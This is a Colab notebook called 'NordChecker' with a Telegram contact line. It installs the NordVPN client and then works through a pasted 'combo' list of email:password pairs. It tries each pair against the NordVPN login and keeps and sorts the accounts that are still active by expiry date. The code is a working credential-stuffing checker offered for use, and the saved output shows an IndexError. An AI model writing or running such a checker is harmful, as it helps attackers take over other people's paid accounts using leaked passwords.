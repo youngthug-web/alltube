{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Copy of NordChecker.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/youngthug-web/alltube/blob/master/Copy_of_NordChecker.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "dMnsw5KKDT6E",
        "cellView": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 232
        },
        "outputId": "4f4b8daa-08dc-418c-d64f-397727801423"
      },
      "source": [
        "# Contacts: http://t.me/biplob_sd\n",
        "\n",
        "#_________________________________________________________________________________________________________________________________________#\n",
        "#CREATE THE CONFIG\n",
        "# import your combo file (email:pass)\n",
        "data = r\"\"\"\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\"\"\".split(\"\\n\")\n",
        "#_________________________________________________________________________________________________________________________________________#\n",
        "\n",
        "import os, re, sys, subprocess; from IPython.display import clear_output; from datetime import datetime\n",
        "if os.path.isfile(\"/usr/bin/nordvpn\") == False:\n",
        "  !wget --directory-prefix /tmp https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb\n",
        "  !sudo apt install -y /tmp/nordvpn-release_1.0.0_all.deb && sudo apt update && sudo apt install nordvpn -y\n",
        "else:\n",
        "  os.system('pkill nordvpn')\n",
        "clear_output(wait=True)\n",
        "!nordvpn logout\n",
        "!systemctl enable nordvpnd\n",
        "!service nordvpn start &\n",
        "clear_output()\n",
        "count = 0\n",
        "unsort = []\n",
        "for line in data:\n",
        "    if not len(line.strip()) == 0 :\n",
        "      count += 1\n",
        "      user , pas = line.strip().split(':') \n",
        "      res , opt  = subprocess.getstatusoutput(f'nordvpn login -u {user} -p {pas}')\n",
        "      data = opt.split('\\n')\n",
        "      data = data[-1].split('Please try again.')\n",
        "      if res == 0:\n",
        "          data = os.popen('nordvpn account').read()\n",
        "          data = data.split('Account Information:')[1]\n",
        "          data = data.split('Email Address: ')[1]\n",
        "          email , data = data.rstrip().split('VPN Service: ')\n",
        "          print(str(count)+'- ' +user+':'+pas+'\\t'+data)\n",
        "          if not data[0] == 'I':\n",
        "            unsort.append({'Account':user+':'+pas,'Expires':str(data)})\n",
        "          os.system('nordvpn logout')\n",
        "      else:\n",
        "          print(str(count)+'- '+user+':'+pas+'\\t'+str(data[0]))\n",
        "      os.system('systemctl enable nordvpnd')\n",
        "      os.system('service nordvpn start')\n",
        "print(\"\\n\\nOnly Active Account: (Sort as Time)\")\n",
        "sort = sorted(\n",
        "    unsort,\n",
        "    key=lambda x: datetime.strptime(re.sub(r\"(st|th|nd|rd)\", \"\", x['Expires']), 'Active (Expires on %b %d, %Y)'), reverse=True)\n",
        "for p in sort:\n",
        "  print(p['Account']+'\\t'+p['Expires'])"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "error",
          "ename": "IndexError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mIndexError\u001b[0m                                Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-3-e9118712d5ab>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m     77\u001b[0m       \u001b[0;32mif\u001b[0m \u001b[0mres\u001b[0m \u001b[0;34m==\u001b[0m \u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     78\u001b[0m           \u001b[0mdata\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mpopen\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'nordvpn account'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 79\u001b[0;31m           \u001b[0mdata\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msplit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'Account Information:'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     80\u001b[0m           \u001b[0mdata\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msplit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'Email Address: '\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0;36m1\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     81\u001b[0m           \u001b[0memail\u001b[0m \u001b[0;34m,\u001b[0m \u001b[0mdata\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mdata\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mrstrip\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msplit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'VPN Service: '\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mIndexError\u001b[0m: list index out of range"
          ]
        }
      ]
    }
  ]
}